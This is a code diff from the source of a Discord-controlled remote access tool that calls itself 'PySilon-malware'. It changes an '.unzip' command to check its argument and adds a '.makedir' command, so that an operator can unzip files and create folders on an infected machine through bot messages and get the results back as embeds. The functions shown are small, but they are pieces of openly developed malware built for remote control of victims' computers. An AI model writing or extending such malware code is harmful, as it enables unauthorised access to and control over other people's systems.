@@ -141,6 +141,29 @@ async def file_uploading(ctx, argument=None, name_of_file=None):
         await ctx.send(embed=embed)
 
 @client.command(name="unzip")
-async def unzip_command(ctx, filename):
+async def unzip_command(ctx, filename=None):
+    if filename != None:
+        await ctx.message.delete()
+        await unzip(ctx, filename)
+    else:
+        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .unzip <path/to/zip_file>```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        await ctx.send(embed=embed)
+
+@client.command(name="makedir")
+async def create_directory(ctx, path=None):
     await ctx.message.delete()
-    await unzip(ctx, filename)
+    if path != None:
+        try:
+            os.mkdir(path)
+            embed = discord.Embed(title=f"🟢 Success",description=f"```Directory {path} has been successfully created.```", colour=discord.Colour.green())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            await ctx.send(embed=embed)
+        except Exception as e:
+            embed = discord.Embed(title="📛 Error",description=f'```Something went wrong.\n\n{str(e)}```', colour=discord.Colour.red())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .mkdir <path>```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        await ctx.send(embed=embed)
